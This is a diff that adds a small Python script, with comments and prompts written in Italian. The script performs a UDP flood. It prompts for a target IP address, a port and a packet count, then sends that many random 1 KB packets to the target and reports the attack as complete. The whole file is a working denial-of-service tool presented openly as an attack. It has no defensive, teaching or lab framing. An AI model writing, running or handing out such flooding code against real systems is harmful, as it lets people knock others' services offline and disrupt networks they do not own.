@@ -1,0 +1,31 @@
+import socket
+import random
+
+def udp_flood(target_ip, target_port, num_packets):
+    # Qui creo il socket UDP
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    # Qui creo il pacchetto da 1 KB
+    packet_size = 1024  # 1 KB
+    packet = random._urandom(packet_size)
+
+    print(f"Inviando {num_packets} pacchetti a {target_ip}:{target_port}")
+
+    for i in range(num_packets):
+        try:
+            client.sendto(packet, (target_ip, target_port))
+            print(f"Pacchetto {i+1} inviato")
+        except Exception as e:
+            print(f"Errore durante l'invio del pacchetto {i+1}: {e}")
+
+    client.close()
+    print("Attacco completato")
+
+if __name__ == "__main__":
+    # Richiedi all'utente di inserire l'IP target, la porta target e il numero di pacchetti
+    target_ip = input("Inserisci l'IP target: ")
+    target_port = int(input("Inserisci la porta target: "))
+    num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
+
+    # Esegui l'attacco UDP flood
+    udp_flood(target_ip, target_port, num_packets)
